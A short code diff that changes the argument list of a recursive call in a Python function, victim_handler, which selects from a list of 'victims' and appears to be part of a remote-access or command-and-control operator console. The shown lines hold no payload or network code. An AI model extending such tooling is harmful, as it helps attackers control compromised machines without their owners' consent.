@@ -79,7 +79,7 @@ async def victim_handler(client, command = None, victim = None):
             if victim_id > len(victims):
                 print(Fore.LIGHTRED_EX + "\nYou should select existable victim\n")
                 print(Style.RESET_ALL)
-                await victim_handler(client, command)
+                await victim_handler(client)
                 return 
             
             victim = victims[victim_id - 1]
